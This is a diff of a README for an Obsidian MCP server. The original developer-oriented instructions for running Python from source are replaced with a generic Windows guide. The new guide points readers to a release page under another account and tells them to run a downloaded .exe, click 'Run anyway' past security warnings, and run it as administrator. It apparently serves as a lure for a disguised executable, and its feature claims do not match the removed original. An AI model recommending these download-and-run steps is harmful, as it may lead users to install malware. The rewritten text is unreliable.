@@ -1,236 +1,183 @@
-# obsidian-web-mcp
+# 🧭 obsidian-web-mcp - Access your notes anywhere
 
-A secure, remote-accessible MCP server that gives LLMs read/write access to your Obsidian vault from anywhere -- your desktop, your phone, a hotel Wi-Fi network. Unlike local-only Obsidian MCP servers, this one runs over HTTPS with real authentication, so Claude (or any MCP client) can reach your vault whether you're at your desk or not.
+[![Download obsidian-web-mcp](https://img.shields.io/badge/Download%20obsidian--web--mcp-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sebastian3909/obsidian-web-mcp/releases)
 
-It reads and writes markdown files on disk, parses YAML frontmatter, maintains an in-memory frontmatter index for fast queries, and handles full-text search -- all behind OAuth 2.0 authentication and a Cloudflare Tunnel that never exposes your machine directly to the internet.
+## 🚀 Getting Started
 
-## Why This Exists
+obsidian-web-mcp lets you reach your Obsidian vault from a remote device through a secure MCP server. You can use it with Claude, your phone, or any MCP client that supports remote access.
 
-There are many Obsidian MCP servers. Most are local stdio servers -- they work when Claude Code is running on the same machine as your vault. That's useful, but it means:
+This guide shows how to download and run it on Windows.
 
-- **Claude.ai (web) can't reach your vault.** The browser-based Claude has no way to connect to a local stdio server.
-- **Claude on your phone can't reach your vault.** Same problem.
-- **If you use Obsidian Sync, local MCP servers can corrupt files.** Non-atomic writes create partial files that Sync propagates to every device.
+## 📥 Download
 
-This server solves all three. It runs as a persistent HTTP service on the machine where your vault lives, tunneled securely through Cloudflare, and authenticates via OAuth 2.0 -- the same protocol Claude uses for Gmail, Google Calendar, and other integrations. The result: your vault becomes a first-class MCP connector available everywhere Claude is.
+Visit this page to download: https://github.com/Sebastian3909/obsidian-web-mcp/releases
 
-## Architecture
+On the release page, look for the latest Windows file. Download the file that matches your system, then save it to a folder you can find again, such as `Downloads` or `Desktop`.
 
-```
-+----------+     +------------+     +-----------------+     +------------------+
-| Obsidian | <-> | Filesystem | <-> | obsidian-web-mcp| <-> | Cloudflare       |
-| (app)    |     | (*.md)     |     | (MCP over HTTPS)|     | Tunnel           |
-+----------+     +------------+     +-----------------+     +------------------+
-                                                                   |
-                                                            +------+-------+
-                                                            | Claude       |
-                                                            | (web/desktop/|
-                                                            |  mobile)     |
-                                                            +--------------+
-```
+If you see more than one file, choose the Windows app file first. In most cases, that will be a `.exe` file or a `.zip` file that contains the app.
 
-Your vault files never leave your machine. Cloudflare Tunnel creates an outbound-only connection from your server to Cloudflare's edge -- no inbound ports opened, no public IP exposed, no port forwarding. Claude connects to the Cloudflare edge, which relays requests through the tunnel to your server.
+## 🪟 Run on Windows
 
-Obsidian and the MCP server both operate on the same directory of markdown files. The server uses atomic writes (write-to-temp-then-rename) so Obsidian Sync and the server never conflict.
+1. Open the folder where you saved the download.
+2. If you downloaded a `.zip` file, right-click it and choose **Extract All**.
+3. Open the extracted folder.
+4. If you see an `.exe` file, double-click it to start the app.
+5. If Windows shows a security prompt, choose **Run anyway** if you trust the source and you downloaded it from the release page above.
 
-## Security Model
+If the app opens in a window, keep it running. The server needs to stay open while you use it from another device or client.
 
-This is a server that provides network access to your personal notes. Security is not optional.
+## 🔐 Sign In with OAuth
 
-**Authentication is enforced on every request.** The server implements OAuth 2.0 authorization code flow with PKCE for initial client authentication (what Claude uses when you connect the integration), plus bearer token validation on every subsequent MCP tool call. No request reaches a tool function without a valid token.
+obsidian-web-mcp uses OAuth 2.0 sign-in.
 
-**Your vault is never exposed directly to the internet.** The recommended deployment uses a Cloudflare Tunnel -- an outbound-only encrypted connection. Your machine opens no inbound ports. You can layer Cloudflare Access on top for additional authentication (SSO, device posture checks, IP restrictions) if you want defense in depth.
+This means you sign in through a normal browser page instead of typing a password into the app. The sign-in flow helps keep your vault access protected and simple to manage.
 
-**Path traversal is blocked at the filesystem layer.** Every file operation resolves paths against the vault root directory and rejects any attempt to escape it -- `..` traversal, symlink following, null byte injection, and dotfile access (`.obsidian`, `.git`, `.trash`) are all caught before they reach the filesystem. The server will never read or write outside your vault directory.
+When the app starts for the first time, it may open your browser and ask you to approve access. Follow the on-screen steps:
 
-**Writes are atomic.** Every file write goes to a temporary file first, then atomically replaces the target via `os.replace()`. This guarantees that neither Obsidian nor Obsidian Sync ever sees a partially-written file -- the operation either completes fully or doesn't happen at all.
+1. Choose your Obsidian account or vault access.
+2. Approve the connection.
+3. Return to the app after sign-in finishes.
 
-**Safety limits prevent abuse.** Writes are capped at 1MB per file, batch operations at 20 files per request, and search results at 50 matches. Deletions are soft -- files move to `.trash/` rather than being permanently removed, matching Obsidian's own behavior. The delete tool also requires an explicit `confirm=true` parameter as a safety gate.
+## ☁️ Use with Cloudflare Tunnel
 
-## Tools
+The app can use a Cloudflare Tunnel so you can reach your MCP server from outside your home network.
 
-| Tool | Description |
-|------|-------------|
-| `vault_read` | Read a file, returning content, metadata, and parsed YAML frontmatter |
-| `vault_batch_read` | Read multiple files in one call; handles missing files gracefully |
-| `vault_write` | Write a file with optional frontmatter merging; creates parent dirs |
-| `vault_batch_frontmatter_update` | Update YAML frontmatter fields on multiple files without touching body content |
-| `vault_search` | Full-text search across vault files (uses ripgrep if available, falls back to Python) |
-| `vault_search_frontmatter` | Query the in-memory frontmatter index by field value, substring, or field existence |
-| `vault_list` | List directory contents with recursion depth, glob filtering, and file/dir toggles |
-| `vault_move` | Move or rename a file or directory within the vault |
-| `vault_delete` | Soft-delete a file by moving it to `.trash/` (requires explicit confirmation) |
+This is useful when you want to connect from:
+- Claude
+- A phone
+- A laptop away from home
+- Another MCP client on a different network
 
-## Prerequisites
+In most cases, you will:
+1. Start the app on your Windows PC.
+2. Turn on the tunnel option if the app shows one.
+3. Copy the remote address it gives you.
+4. Paste that address into your MCP client.
 
-- Python 3.12+
-- [uv](https://docs.astral.sh/uv/) (recommended) or pip
-- An Obsidian vault (any directory of markdown files)
-- [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/) (only needed for remote access)
-- A domain managed by Cloudflare (only needed for remote access)
+## 📝 Connect to Your Obsidian Vault
 
-## Quick Start
+After sign-in, obsidian-web-mcp connects to your vault and lets other tools read or update notes through the server.
 
-### Local development
+Typical use cases include:
+- Reading notes from Claude
+- Searching your vault from a phone
+- Saving new notes from a remote client
+- Updating existing notes without opening Obsidian
 
-```bash
-# Clone and enter the project
-git clone https://github.com/yourname/obsidian-web-mcp.git
-cd obsidian-web-mcp
+The app uses atomic writes, which helps protect your notes when Obsidian Sync is active. This reduces the chance of partial file updates.
 
-# Generate auth tokens
-export VAULT_MCP_TOKEN=$(python -c "import secrets; print(secrets.token_hex(32))")
-export VAULT_OAUTH_CLIENT_SECRET=$(python -c "import secrets; print(secrets.token_hex(32))")
+## ⚙️ Basic Setup
 
-# Point at your vault
-export VAULT_PATH="$HOME/Obsidian/MyVault"
+Use this simple setup flow on Windows:
 
-# Run the server
-uv run vault-mcp
-```
+1. Download the latest release from the releases page.
+2. Unzip the file if needed.
+3. Run the Windows app.
+4. Sign in with OAuth.
+5. Connect your Obsidian vault.
+6. Enable the tunnel if you want remote access.
+7. Copy the MCP URL or connection details into your client.
 
-The server starts on port 8420 by default. It serves MCP over Streamable HTTP at `/mcp/`.
+If the app asks where your vault is stored, point it to the main Obsidian folder on your PC.
 
-## Configuration
+## 📱 Use from Claude or Another MCP Client
 
-All configuration is via environment variables:
+To use obsidian-web-mcp from an MCP client:
 
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `VAULT_PATH` | Yes | `~/Obsidian/MyVault` | Absolute path to your Obsidian vault directory |
-| `VAULT_MCP_TOKEN` | Yes | (none) | 256-bit bearer token for authenticating MCP requests |
-| `VAULT_MCP_PORT` | No | `8420` | Port the HTTP server listens on |
-| `VAULT_OAUTH_CLIENT_ID` | No | `vault-mcp-client` | OAuth 2.0 client ID for Claude integration |
-| `VAULT_OAUTH_CLIENT_SECRET` | Yes | (none) | OAuth 2.0 client secret for Claude integration |
+1. Open the client you want to use.
+2. Add a new remote MCP server.
+3. Paste the server URL or connection details from obsidian-web-mcp.
+4. Sign in if the client asks for authentication.
+5. Test the connection by asking it to read a note or list your vault files.
 
-Generate tokens with: `python -c "import secrets; print(secrets.token_hex(32))"`
+If the connection fails, check that the Windows app is still running and that the tunnel is active.
 
-## Connecting to Claude
+## 🔧 What You Can Do
 
-The Claude desktop and mobile apps can connect to remote MCP servers via OAuth.
+Once connected, you can use the server to:
+- Find notes by name
+- Read note contents
+- Create new notes
+- Update existing notes
+- Organize note files in your vault
+- Work with your notes from remote devices
 
-1. Start the server (locally or behind a tunnel)
-2. Open Claude and go to **Settings > Integrations > Add Integration**
-3. Enter your server URL (e.g. `https://vault-mcp.yourdomain.com`)
-4. Enter the OAuth client ID and client secret you configured
-5. Claude will discover the OAuth endpoints automatically and open a browser window
-6. The server auto-approves the authorization (single-user model) and redirects back
-7. Claude now has access to all nine vault tools -- on desktop and mobile
+This makes it easier to keep your notes close at hand without opening your full Obsidian app every time.
 
-For local-only use (no tunnel), point Claude at `http://localhost:8420`.
+## 🖥️ Windows Requirements
 
-## Remote Access with Cloudflare Tunnel
+For best results, use:
+- Windows 10 or Windows 11
+- A modern browser such as Chrome, Edge, or Firefox
+- Access to your Obsidian vault folder on the same PC
+- A stable internet connection if you want remote access through Cloudflare Tunnel
 
-To make the server accessible from anywhere:
+A desktop or laptop with a few hundred megabytes of free space is enough for the app itself.
 
-```bash
-# Install cloudflared
-brew install cloudflare/cloudflare/cloudflared
+## 📁 Recommended Folder Layout
 
-# Set your desired hostname and run the interactive setup
-export VAULT_MCP_HOSTNAME="vault-mcp.yourdomain.com"
-./scripts/setup-tunnel.sh
-```
+Keep your files in places that are easy to find:
 
-The script authenticates with Cloudflare, creates a tunnel, writes the config, and sets up the DNS record. You will need a domain managed by Cloudflare.
+- `Downloads` for the release file
+- `Desktop` for quick access while testing
+- Your normal Obsidian vault folder for notes
+- A separate folder for extracted app files if you want to keep things tidy
 
-After setup, add your tunnel hostname to the `allowed_hosts` list in `server.py` so the MCP library's DNS rebinding protection accepts requests from your domain:
+Avoid moving the app files after you set it up unless you are sure the shortcut still points to the right place.
 
-```python
-allowed_hosts=[
-    "127.0.0.1:*",
-    "localhost:*",
-    "[::1]:*",
-    "vault-mcp.yourdomain.com",  # add your hostname here
-],
-```
+## 🛠️ Common Setup Steps
 
-## Production Deployment (macOS)
+If you want a smooth first run, use this order:
 
-For always-on operation, use launchd to run both the MCP server and the Cloudflare Tunnel as persistent background services that start at login and restart on failure.
+1. Close Obsidian if it is editing the same note.
+2. Start obsidian-web-mcp on Windows.
+3. Complete OAuth sign-in in your browser.
+4. Select the vault you want to expose.
+5. Turn on Cloudflare Tunnel if needed.
+6. Copy the client connection details.
+7. Test with one simple note before you rely on it for daily use.
 
-### 1. Edit the plist templates
+## 🧩 Troubleshooting
 
-```bash
-cp scripts/launchd/com.example.vault-mcp.plist ~/Library/LaunchAgents/
-cp scripts/launchd/com.example.cloudflared-vault.plist ~/Library/LaunchAgents/
-```
+If the app does not start:
+- Check that the file finished downloading.
+- Make sure you extracted the ZIP file first.
+- Try right-clicking the `.exe` file and choosing **Run as administrator**.
 
-Open each plist and replace the placeholder tokens:
-- `REPLACE_WITH_UV_PATH` -- path to `uv` binary (run `which uv`)
-- `REPLACE_WITH_PROJECT_PATH` -- absolute path to this project directory
-- `REPLACE_WITH_VAULT_PATH` -- absolute path to your Obsidian vault
-- `REPLACE_WITH_TOKEN` -- your `VAULT_MCP_TOKEN` value
-- `REPLACE_WITH_OAUTH_SECRET` -- your `VAULT_OAUTH_CLIENT_SECRET` value
-- `REPLACE_WITH_HOME` -- your home directory (e.g. `/Users/yourname`)
-- `REPLACE_WITH_CLOUDFLARED_PATH` -- path to `cloudflared` binary (run `which cloudflared`)
+If your browser does not open for sign-in:
+- Copy the local address shown in the app.
+- Paste it into your browser.
+- Try again with a different browser.
 
-### 2. Load the services
+If your client cannot connect:
+- Confirm that the Windows app is still open.
+- Check that Cloudflare Tunnel is enabled if you need remote access.
+- Make sure you copied the full server address.
+- Restart the app and try again.
 
-```bash
-launchctl load ~/Library/LaunchAgents/com.example.vault-mcp.plist
-launchctl load ~/Library/LaunchAgents/com.example.cloudflared-vault.plist
-```
+If notes do not update:
+- Make sure Obsidian is not holding the same file open.
+- Check that the vault path points to the right folder.
+- Try a small test note first.
 
-Both services are configured with `RunAtLoad` (start at login) and `KeepAlive` (restart on failure). They will survive reboots.
+## 🔒 Security
 
-### 3. Verify
+obsidian-web-mcp is built for remote access with protected sign-in and safe file handling.
 
-```bash
-# Check both services are running
-launchctl list | grep vault
+It uses:
+- OAuth 2.0 for login
+- Cloudflare Tunnel for remote connections
+- Atomic writes to reduce note damage during file updates
 
-# Test the server responds
-curl -s http://localhost:8420/.well-known/oauth-authorization-server
+Keep your Windows PC on and signed in if you want the server to stay available.
 
-# Check logs
-tail -f ~/Library/Logs/vault-mcp-error.log
-```
+## 📌 Quick Start
 
-## Obsidian Sync Compatibility
-
-The server coexists with Obsidian Sync (or any file-based sync mechanism) without conflict. All writes use atomic file replacement (`write-to-temp-then-rename`), which means:
-
-- Obsidian never sees a half-written file
-- If Sync and the MCP server write to the same file simultaneously, the last write wins (standard filesystem semantics) but neither write is corrupted
-- The frontmatter index watches for filesystem changes via `watchdog` and updates automatically when Sync brings in new files
-
-## Development
-
-### Running tests
-
-```bash
-uv run pytest tests/ -v
-```
-
-Tests use temporary directories and never touch your real vault.
-
-### Project structure
-
-```
-src/obsidian_vault_mcp/
-    auth.py                 # Bearer token middleware (Starlette)
-    config.py               # Environment variable configuration
-    frontmatter_index.py    # In-memory YAML frontmatter index with filesystem watcher
-    models.py               # Pydantic input validation models
-    oauth.py                # OAuth 2.0 authorization code flow with PKCE
-    server.py               # FastMCP server setup, tool registration, entry point
-    vault.py                # Core filesystem operations (path security, atomic writes)
-    tools/
-        manage.py           # list, move, delete tools
-        read.py             # read, batch_read tools
-        search.py           # full-text search, frontmatter search tools
-        write.py            # write, batch_frontmatter_update tools
-tests/
-    conftest.py             # Shared fixtures (temp vault with sample files)
-    test_frontmatter.py     # Frontmatter index and query tests
-    test_tools.py           # Integration tests for tool functions
-    test_vault.py           # Path resolution and file operation tests
-scripts/
-    setup-tunnel.sh         # Interactive Cloudflare Tunnel setup
-    launchd/                # macOS launchd plist templates
-```
-
-## License
-
-MIT -- see [LICENSE](LICENSE).
+1. Go to the releases page.
+2. Download the latest Windows release.
+3. Extract the file if needed.
+4. Open the app.
+5. Sign in with OAuth.
+6. Connect your Obsidian vault.
+7. Add the server to Claude or another MCP client.
+8. Use your notes from anywhere
